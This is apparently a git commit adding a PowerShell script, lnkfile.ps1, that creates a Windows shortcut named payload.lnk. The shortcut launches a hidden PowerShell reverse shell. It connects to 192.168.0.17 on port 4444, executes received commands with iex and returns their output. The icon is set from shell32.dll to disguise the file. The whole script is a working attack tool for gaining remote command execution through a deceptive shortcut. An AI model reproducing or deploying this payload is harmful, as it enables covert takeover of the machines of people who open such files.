4152465145b86809121a5bad21ddaf3389eea53d
browninfosecguy <37906998+browninfosecguy@users.noreply.github.com>
2018-05-07 23:17:25 -0400

    Initla Commit
    Initla Commit

---
+++ lnkfile.ps1
@@ -0,0 +1,11 @@
+$WshShell = New-Object -comObject WScript.Shell 
+
+$Shortcut = $WshShell.CreateShortcut("c:\users\sunny\desktop\payload.lnk") 
+
+$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" 
+
+$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,7840" 
+
+$Shortcut.Arguments = '-windowstyle hidden /c $client = New-Object System.Net.Sockets.TCPClient("""192.168.0.17""",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + """PS """ + (pwd).Path + """> """;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
+
+$Shortcut.Save() 
